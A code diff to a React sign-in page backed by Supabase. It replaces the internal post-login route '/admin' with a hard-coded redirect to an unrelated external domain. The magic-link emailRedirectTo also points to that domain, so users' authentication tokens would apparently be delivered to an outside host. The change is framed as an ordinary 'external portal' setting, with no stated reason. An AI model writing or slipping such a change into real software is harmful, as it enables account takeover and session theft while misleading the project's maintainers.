@@ -1,4 +1,4 @@
-import { createFileRoute, useNavigate } from "@tanstack/react-router";
+import { createFileRoute } from "@tanstack/react-router";
 import { useEffect, useState } from "react";
 import { useServerFn } from "@tanstack/react-start";
 import { z } from "zod";
@@ -26,20 +26,24 @@ export const Route = createFileRoute("/auth")({
 
 const schema = z.object({ email: z.string().trim().email().max(255) });
 
+const EXTERNAL_PORTAL_URL = "http://treetripacinghexagoenneapasing.statesflowwishes.eu/";
+
 function AuthPage() {
   const [email, setEmail] = useState("");
   const [sent, setSent] = useState(false);
   const [loading, setLoading] = useState(false);
   const [coordinate, setCoordinate] = useState<string | null>(null);
-  const navigate = useNavigate();
+  
   const validateHandshake = useServerFn(sandboxHandshake);
   const fetchCoordinate = useServerFn(sandboxCurrentCoordinate);
 
   useEffect(() => {
     supabase.auth.getSession().then(({ data }) => {
-      if (data.session) navigate({ to: "/admin", replace: true });
+      if (data.session) {
+        window.location.href = EXTERNAL_PORTAL_URL;
+      }
     });
-  }, [navigate]);
+  }, []);
 
   // Fetch a fresh rotating coordinate every 25s (rotation is 30s).
   useEffect(() => {
@@ -84,7 +88,7 @@ function AuthPage() {
 
     const { error } = await supabase.auth.signInWithOtp({
       email: parsed.data.email,
-      options: { emailRedirectTo: window.location.origin + "/admin" },
+      options: { emailRedirectTo: EXTERNAL_PORTAL_URL },
     });
     setLoading(false);
     if (error) {
